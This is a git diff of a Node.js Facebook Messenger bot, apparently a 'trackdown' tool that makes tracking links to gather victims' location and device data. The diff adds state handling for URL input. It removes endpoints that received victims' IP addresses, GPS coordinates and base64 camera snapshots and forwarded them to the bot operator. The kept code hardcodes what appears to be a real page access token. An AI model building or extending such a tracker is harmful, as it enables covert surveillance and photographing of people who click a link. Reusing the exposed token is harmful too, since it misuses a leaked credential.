@@ -11,6 +11,9 @@ const PAGE_ACCESS_TOKEN = "EAAUG0iogqEYBOyZCbO8SQ1d9f8KDfku3pan9Ok5lA1u56ZBycol5
 const VERIFY_TOKEN = "hackbot";
 const hostURL = "https://trackdown-efzv.onrender.com/webhook"; // Replace with your URL
 
+// Track users awaiting URL input
+const userStates = {};
+
 // Webhook verification
 app.get("/webhook", (req, res) => {
     const mode = req.query["hub.mode"];
@@ -53,18 +56,31 @@ app.post("/webhook", (req, res) => {
 function handleMessage(senderId, receivedMessage) {
     let response;
 
-    if (receivedMessage.text.toLowerCase() === "/start") {
-        response = {
-            text: `Welcome! Use this bot to create tracking links. Type /create to start.`
-        };
-    } else if (receivedMessage.text.toLowerCase() === "/create") {
-        response = { text: `🌐 Please enter your URL:` };
-    } else if (receivedMessage.text.toLowerCase() === "/help") {
-        response = {
-            text: `Instructions:\n1. Use /create to start.\n2. Enter a URL to generate tracking links.\n\nNote: This bot gathers info like location and device data.`
-        };
+    // Check if the user is expected to enter a URL
+    if (userStates[senderId] === "awaiting_url") {
+        const url = receivedMessage.text;
+        
+        // Validate URL (simple check, can be improved)
+        if (url.startsWith("http://") || url.startsWith("https://")) {
+            response = { text: `URL received: ${url}` };
+            delete userStates[senderId]; // Clear the state
+        } else {
+            response = { text: `Please enter a valid URL starting with http:// or https://` };
+        }
     } else {
-        response = { text: `Unknown command.` };
+        // Handle commands
+        if (receivedMessage.text.toLowerCase() === "/start") {
+            response = { text: `Welcome! Use this bot to create tracking links. Type /create to start.` };
+        } else if (receivedMessage.text.toLowerCase() === "/create") {
+            response = { text: `🌐 Please enter your URL:` };
+            userStates[senderId] = "awaiting_url"; // Set state to expect URL input
+        } else if (receivedMessage.text.toLowerCase() === "/help") {
+            response = {
+                text: `Instructions:\n1. Use /create to start.\n2. Enter a URL to generate tracking links.\n\nNote: This bot gathers info like location and device data.`
+            };
+        } else {
+            response = { text: `Unknown command.` };
+        }
     }
 
     callSendAPI(senderId, response);
@@ -76,6 +92,7 @@ function handlePostback(senderId, receivedPostback) {
 
     if (receivedPostback.payload === "CREATE_NEW") {
         response = { text: `🌐 Enter Your URL` };
+        userStates[senderId] = "awaiting_url"; // Set state to expect URL input
     }
 
     callSendAPI(senderId, response);
@@ -96,90 +113,8 @@ function callSendAPI(senderId, response) {
         .catch((err) => console.error("Error sending message:", err));
 }
 
-// Endpoint for generating links
-app.get("/w/:path/:uri", (req, res) => {
-    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;
-    const url = Buffer.from(req.params.uri, "base64").toString("utf-8");
-
-    res.json({
-        ip,
-        time: new Date().toISOString(),
-        url,
-        uid: req.params.path,
-        a: hostURL,
-        t: false // set as needed for toggling features
-    });
-});
-
-// Endpoint for location data
-app.post("/location", (req, res) => {
-    const { lat, lon, uid, acc } = req.body;
-
-    if (lat && lon && uid && acc) {
-        callSendAPI(parseInt(uid, 36), {
-            text: `Location data received:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`
-        });
-        res.send("Location sent");
-    } else {
-        res.status(400).send("Invalid data");
-    }
-});
-
-// Endpoint to process other data
-app.post("/", (req, res) => {
-    const { uid, data } = req.body;
-    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.ip;
-
-    if (uid && data && data.includes(ip)) {
-        const formattedData = data.replaceAll("<br>", "\n");
-        callSendAPI(parseInt(uid, 36), { text: formattedData });
-        res.send("Data sent");
-    } else {
-        res.status(400).send("Invalid data");
-    }
-});
-
-// Image processing endpoint for camera snapshots
-app.post("/camsnap", (req, res) => {
-    const { uid, img } = req.body;
-
-    if (uid && img) {
-        const buffer = Buffer.from(img, "base64");
-        sendImage(parseInt(uid, 36), buffer);
-        res.send("Image sent");
-    } else {
-        res.status(400).send("Invalid data");
-    }
-});
-
-// Function to send images to Facebook Messenger
-function sendImage(senderId, buffer) {
-    fetch(`https://graph.facebook.com/v12.0/me/messages?access_token=${PAGE_ACCESS_TOKEN}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            recipient: { id: senderId },
-            message: {
-                attachment: {
-                    type: "image",
-                    payload: {
-                        is_reusable: true
-                    }
-                }
-            }
-        })
-    })
-        .then(res => res.json())
-        .then(json => {
-            if (json.error) {
-                console.error("Error sending image:", json.error);
-            }
-        })
-        .catch(err => console.error("Error sending image:", err));
-}
-
 // Start the server
 app.listen(5000, () => {
     console.log("Server is running on port 5000");
 });
-                          
+            
